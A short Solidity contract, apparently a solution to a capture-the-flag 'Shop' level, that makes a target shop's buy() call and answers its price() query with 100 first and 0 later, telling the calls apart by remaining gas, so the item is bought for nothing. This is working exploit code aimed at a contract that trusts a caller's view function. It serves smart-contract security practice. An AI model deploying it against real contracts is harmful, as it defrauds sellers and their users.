```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
}

contract ShopSolution {
    uint256 private _gasStart;

    function manipulatePrice(address _shop) external {
        _gasStart = gasleft();
        IShop(_shop).buy();
    }

    function price() external view returns (uint256) {
        uint256 gasSinceStart = _gasStart - gasleft();
        if (gasSinceStart < 30000) {
            // High price.
            return 100;
        }
        // Burn some gas..
        for (uint256 i = 0; i < 500; i++) {}
        // Giveaway price.
        return 0;
    }
}
```
